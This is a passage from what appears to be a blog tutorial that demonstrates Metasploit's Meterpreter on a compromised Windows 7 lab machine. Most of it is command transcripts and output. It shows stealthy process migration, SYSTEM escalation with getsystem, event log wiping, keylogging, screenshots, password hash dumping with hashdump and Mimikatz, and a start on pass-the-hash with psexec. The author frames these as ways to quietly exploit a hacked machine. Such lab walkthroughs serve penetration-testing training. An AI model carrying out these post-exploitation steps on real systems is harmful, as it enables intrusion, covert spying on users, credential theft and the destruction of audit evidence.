</span><span class='line'>  --  ----                   -----------                                ----------
</span><span class='line'>  5   meterpreter x86/win32  WIN-D7GA2J1M0TU\wingoat @ WIN-D7GA2J1M0TU  192.168.80.155:4444 -&gt; 192.168.80.128:49281 (192.168.80.128)
</span><span class='line'>
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions -i 5
</span><span class='line'>[*] Starting interaction with 5...</span></code></pre></td></tr></table></div></figure>


<p>The reason I wanted to show Meterpreter on a Windows target is because there are many commands unique to Windows that we can use. I will demo them further</p>

<h2>Meterpreter commands</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; ?
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command                   Description
</span><span class='line'>    -------                   -----------
</span><span class='line'>    ?                         Help menu
</span><span class='line'>    background                Backgrounds the current session
</span><span class='line'>    bgkill                    Kills a background meterpreter script
</span><span class='line'>    bglist                    Lists running background scripts
</span><span class='line'>    bgrun                     Executes a meterpreter script as a background thread
</span><span class='line'>    channel                   Displays information or control active channels
</span><span class='line'>    close                     Closes a channel
</span><span class='line'>    disable_unicode_encoding  Disables encoding of unicode strings
</span><span class='line'>    enable_unicode_encoding   Enables encoding of unicode strings
</span><span class='line'>    exit                      Terminate the meterpreter session
</span><span class='line'>    get_timeouts              Get the current session timeout values
</span><span class='line'>    help                      Help menu
</span><span class='line'>    info                      Displays information about a Post module
</span><span class='line'>    irb                       Drop into irb scripting mode
</span><span class='line'>    load                      Load one or more meterpreter extensions
</span><span class='line'>    machine_id                Get the MSF ID of the machine attached to the session
</span><span class='line'>    migrate                   Migrate the server to another process
</span><span class='line'>    quit                      Terminate the meterpreter session
</span><span class='line'>    read                      Reads data from a channel
</span><span class='line'>    resource                  Run the commands stored in a file
</span><span class='line'>    run                       Executes a meterpreter script or Post module
</span><span class='line'>    set_timeouts              Set the current session timeout values
</span><span class='line'>    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span><span class='line'>    transport                 Change the current transport mechanism
</span><span class='line'>    use                       Deprecated alias for 'load'
</span><span class='line'>    uuid                      Get the UUID for the current session
</span><span class='line'>    write                     Writes data to a channel
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: File system Commands
</span><span class='line'>============================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    cat           Read the contents of a file to the screen
</span><span class='line'>    cd            Change directory
</span><span class='line'>    download      Download a file or directory
</span><span class='line'>    edit          Edit a file
</span><span class='line'>    getlwd        Print local working directory
</span><span class='line'>    getwd         Print working directory
</span><span class='line'>    lcd           Change local working directory
</span><span class='line'>    lpwd          Print local working directory
</span><span class='line'>    ls            List files
</span><span class='line'>    mkdir         Make directory
</span><span class='line'>    mv            Move source to destination
</span><span class='line'>    pwd           Print working directory
</span><span class='line'>    rm            Delete the specified file
</span><span class='line'>    rmdir         Remove directory
</span><span class='line'>    search        Search for files
</span><span class='line'>    show_mount    List all mount points/logical drives
</span><span class='line'>    upload        Upload a file or directory
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Networking Commands
</span><span class='line'>===========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    arp           Display the host ARP cache
</span><span class='line'>    getproxy      Display the current proxy configuration
</span><span class='line'>    ifconfig      Display interfaces
</span><span class='line'>    ipconfig      Display interfaces
</span><span class='line'>    netstat       Display the network connections
</span><span class='line'>    portfwd       Forward a local port to a remote service
</span><span class='line'>    route         View and modify the routing table
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: System Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    clearev       Clear the event log
</span><span class='line'>    drop_token    Relinquishes any active impersonation token.
</span><span class='line'>    execute       Execute a command
</span><span class='line'>    getenv        Get one or more environment variable values
</span><span class='line'>    getpid        Get the current process identifier
</span><span class='line'>    getprivs      Attempt to enable all privileges available to the current process
</span><span class='line'>    getsid        Get the SID of the user that the server is running as
</span><span class='line'>    getuid        Get the user that the server is running as
</span><span class='line'>    kill          Terminate a process
</span><span class='line'>    ps            List running processes
</span><span class='line'>    reboot        Reboots the remote computer
</span><span class='line'>    reg           Modify and interact with the remote registry
</span><span class='line'>    rev2self      Calls RevertToSelf() on the remote machine
</span><span class='line'>    shell         Drop into a system command shell
</span><span class='line'>    shutdown      Shuts down the remote computer
</span><span class='line'>    steal_token   Attempts to steal an impersonation token from the target process
</span><span class='line'>    suspend       Suspends or resumes a list of processes
</span><span class='line'>    sysinfo       Gets information about the remote system, such as OS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: User interface Commands
</span><span class='line'>===============================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    enumdesktops   List all accessible desktops and window stations
</span><span class='line'>    getdesktop     Get the current meterpreter desktop
</span><span class='line'>    idletime       Returns the number of seconds the remote user has been idle
</span><span class='line'>    keyscan_dump   Dump the keystroke buffer
</span><span class='line'>    keyscan_start  Start capturing keystrokes
</span><span class='line'>    keyscan_stop   Stop capturing keystrokes
</span><span class='line'>    screenshot     Grab a screenshot of the interactive desktop
</span><span class='line'>    setdesktop     Change the meterpreters current desktop
</span><span class='line'>    uictl          Control some of the user interface components
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Webcam Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    record_mic     Record audio from the default microphone for X seconds
</span><span class='line'>    webcam_chat    Start a video chat
</span><span class='line'>    webcam_list    List webcams
</span><span class='line'>    webcam_snap    Take a snapshot from the specified webcam
</span><span class='line'>    webcam_stream  Play a video stream from the specified webcam
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Elevate Commands
</span><span class='line'>======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    getsystem     Attempt to elevate your privilege to that of local system.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Password database Commands
</span><span class='line'>================================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    hashdump      Dumps the contents of the SAM database
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Timestomp Commands
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    timestomp     Manipulate file MACE attributes</span></code></pre></td></tr></table></div></figure>


<p>The first thing I will do is migrate to the Windows Explorer process, because a stray Notepad might look suspicious. I got the PID from doing a <em>ps</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; migrate 1408
</span><span class='line'>[*] Migrating from 988 to 1408...
</span><span class='line'>[*] Migration completed successfully.
</span><span class='line'>meterpreter &gt; getpid
</span><span class='line'>Current pid: 1408</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 5...
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; echo 'HA HA HA' &gt; read.txt
</span><span class='line'>[*] exec: echo 'HA HA HA' &gt; read.txt
</span><span class='line'>
</span><span class='line'>meterpreter &gt; upload /root/read.txt C:\
</span><span class='line'>[*] uploading  : /root/read.txt -&gt; C:\
</span><span class='line'>[*] uploaded   : /root/read.txt -&gt; C:\\read.txt
</span><span class='line'>meterpreter &gt; cd C:\
</span><span class='line'>meterpreter &gt; cat read.txt
</span><span class='line'>HA HA HA</span></code></pre></td></tr></table></div></figure>


<p>Ok, now I will download something on my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download desktop.ini
</span><span class='line'>[*] downloading: desktop.ini -&gt; desktop.ini
</span><span class='line'>[*] download   : desktop.ini -&gt; desktop.ini
</span><span class='line'>meterpreter &gt; cat desktop.ini
</span><span class='line'>��
</span><span class='line'>[.ShellClassInfo]
</span><span class='line'>LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s now look at some system information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : WIN-D7GA2J1M0TU
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64
</span><span class='line'>System Language : en_US
</span><span class='line'>Domain          : WORKGROUP
</span><span class='line'>Logged On Users : 1
</span><span class='line'>Meterpreter     : x64/win64</span></code></pre></td></tr></table></div></figure>


<p>I attempted to get system privileges and it worked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to clear the event log of the machine, though that is anything but stealthy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clearev
</span><span class='line'>[*] Wiping 1583 records from Application...
</span><span class='line'>[*] Wiping 5436 records from System...
</span><span class='line'>[*] Wiping 1422 records from Security...</span></code></pre></td></tr></table></div></figure>


<p>We can also execute native commands on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; execute -h
</span><span class='line'>Usage: execute -f file [options]
</span><span class='line'>
</span><span class='line'>Executes a command on the remote machine.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -H        Create the process hidden from view.
</span><span class='line'>    -a &lt;opt&gt;  The arguments to pass to the command.
</span><span class='line'>    -c        Channelized I/O (required for interaction).
</span><span class='line'>    -d &lt;opt&gt;  The 'dummy' executable to launch when using -m.
</span><span class='line'>    -f &lt;opt&gt;  The executable command to run.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -i        Interact with the process after creating it.
</span><span class='line'>    -k        Execute process on the meterpreters current desktop
</span><span class='line'>    -m        Execute from memory.
</span><span class='line'>    -s &lt;opt&gt;  Execute process in a given session as the session user
</span><span class='line'>    -t        Execute process with currently impersonated thread token
</span><span class='line'>
</span><span class='line'>meterpreter &gt; execute -f "ipconfig /flushdns" -i -H
</span><span class='line'>Process 2016 created.
</span><span class='line'>Channel 3 created.
</span><span class='line'>
</span><span class='line'>Windows IP Configuration
</span><span class='line'>
</span><span class='line'>Successfully flushed the DNS Resolver Cache.</span></code></pre></td></tr></table></div></figure>


<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; reg -h
</span><span class='line'>Usage: reg [command] [options]
</span><span class='line'>
</span><span class='line'>Interact with the target machine's registry.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -d &lt;opt&gt;  The data to store in the registry value.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).
</span><span class='line'>    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials
</span><span class='line'>    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).
</span><span class='line'>    -v &lt;opt&gt;  The registry value name (E.g. Stuff).
</span><span class='line'>    -w        Set KEY_WOW64 flag, valid values [32|64].
</span><span class='line'>
</span><span class='line'>COMMANDS:
</span><span class='line'>
</span><span class='line'>    enumkey   Enumerate the supplied registry key [-k &lt;key&gt;]
</span><span class='line'>    createkey Create the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    deletekey Delete the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    queryclass Queries the class of the supplied key [-k &lt;key&gt;]
</span><span class='line'>    setval    Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]
</span><span class='line'>    deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]
</span><span class='line'>    queryval  Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span></code></pre></td></tr></table></div></figure>


<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process 2368 created.
</span><span class='line'>Channel 5 created.
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Windows\system32&gt;</span></code></pre></td></tr></table></div></figure>


<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; enumdesktops
</span><span class='line'>Enumerating all accessible desktops
</span><span class='line'>
</span><span class='line'>Desktops
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>    Session  Station  Name
</span><span class='line'>    -------  -------  ----
</span><span class='line'>    1        WinSta0  Default
</span><span class='line'>    1        WinSta0  Disconnect
</span><span class='line'>    1        WinSta0  Winlogon
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getdesktop
</span><span class='line'>Session 1\W\D</span></code></pre></td></tr></table></div></figure>


<p>See how long the user has been idle:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; idletime
</span><span class='line'>User has been idle for: 5 mins 10 secs</span></code></pre></td></tr></table></div></figure>


<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_start 
</span><span class='line'>Starting the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_dump
</span><span class='line'>Dumping captured keystrokes...
</span><span class='line'>much $ such security wow
</span><span class='line'>meterpreter &gt; keyscan_stop
</span><span class='line'>Stopping the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; screenshot
</span><span class='line'>Screenshot saved to: /root/ahhOgnkh.jpeg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/ss.jpeg" title="screenshot" alt="screenshot of target desktop"></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; uictl -h
</span><span class='line'>Usage: uictl [enable/disable] [keyboard/mouse/all]</span></code></pre></td></tr></table></div></figure>


<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; hashdump
</span><span class='line'>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>wingoat:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code></pre></td></tr></table></div></figure>


<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load mimikatz
</span><span class='line'>Loading extension mimikatz...success.
</span><span class='line'>meterpreter &gt; help mimikatz
</span><span class='line'>
</span><span class='line'>Mimikatz Commands
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    kerberos          Attempt to retrieve kerberos creds
</span><span class='line'>    livessp           Attempt to retrieve livessp creds
</span><span class='line'>    mimikatz_command  Run a custom command
</span><span class='line'>    msv               Attempt to retrieve msv creds (hashes)
</span><span class='line'>    ssp               Attempt to retrieve ssp creds
</span><span class='line'>    tspkg             Attempt to retrieve tspkg creds
</span><span class='line'>    wdigest           Attempt to retrieve wdigest creds
</span><span class='line'>meterpreter &gt; msv
</span><span class='line'>[+] Running as SYSTEM
</span><span class='line'>[*] Retrieving msv credentials
</span><span class='line'>msv credentials
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>AuthID   Package    Domain           User              Password
</span><span class='line'>------   -------    ------           ----              --------
</span><span class='line'>0;98494  NTLM       WIN-D7GA2J1M0TU  wingoat           lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
</span><span class='line'>0;996    Negotiate  WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
</span><span class='line'>0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
</span><span class='line'>0;49813  NTLM                                          n.s. (Credentials KO)
</span><span class='line'>0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)</span></code></pre></td></tr></table></div></figure>


<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(psexec) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/psexec):
</span><span class='line'>
</span><span class='line'>   Name                  Current Setting                                                    Required  Description
